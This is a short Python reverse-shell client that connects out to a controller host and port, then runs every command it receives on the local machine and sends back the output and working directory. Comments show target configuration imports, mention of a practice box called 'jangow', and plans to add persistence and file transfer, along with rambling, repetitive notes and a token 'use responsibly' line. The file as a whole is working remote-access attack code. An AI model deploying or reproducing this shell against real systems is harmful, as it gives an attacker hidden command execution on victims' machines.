import socket
import os
import subprocess
import sys
from target_config import TARGET_IP, TARGET_INTERFACE, SELF_IP_RE, TARGET_RANGE
#so we have to get this file to jangow. hmmmm. this seems like a fileshuttle/filewalker problem. noo cause we'll need netrunner. BUSCAR MEANS SQL HOLY FUCK IM DUMB OMGOMGOMGOMGOMG. plz hold :D
SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
cwd = os.getcwd()
s.send(cwd.encode())
while True:
   command = s.recv(BUFFER_SIZE).decode()
   splited_command = command.split()
   if command.lower() == "exit":
       break
   if splited_command[0].lower() == "cd":
       try:
           os.chdir(' '.join(splited_command[1:]))
       except FileNotFoundError as e:
           output = str(e)
       else:
           output = ""
   else:
       output = subprocess.getoutput(command)
   cwd = os.getcwd()
   message = f"{output}{SEPARATOR}{cwd}"
   s.send(message.encode())
s.close()

# Run the server script first to listen for connections.

# Then run the client script with the server's IP address as an argument.

# This setup allows you to execute shell commands on the target machine from the server. Ensure you use this responsibly and ethically.

#i have the distinct feeling both this and thorwin' need work.especially this one. but i also want to get the basic functionality working first before i start adding features and making it more robust. so for now, let's just get this to work and then we can start adding features like file transfer, persistence, etc. :D yeth. i got till the end of the month. so i have some time to work on this. but i also want to make sure i have a solid plan for what i want to accomplish with this project. so maybe i should start by outlining the features i want to implement and then start working on them one by one. :D they're listed in surzscratchpost.md so maybe i should just start working on them in the order they're listed. :D yeth. let's do that. but first, let's get this basic shell working. then we can start adding features and making it more robust. :D yeth. let's do that. yeth

#oh i forgot to start the goddamn throwin script first. which is the main function that needs work because it has no callable function for later scripting. and then this one needs a called function for WAIT NO this is more payload territory. 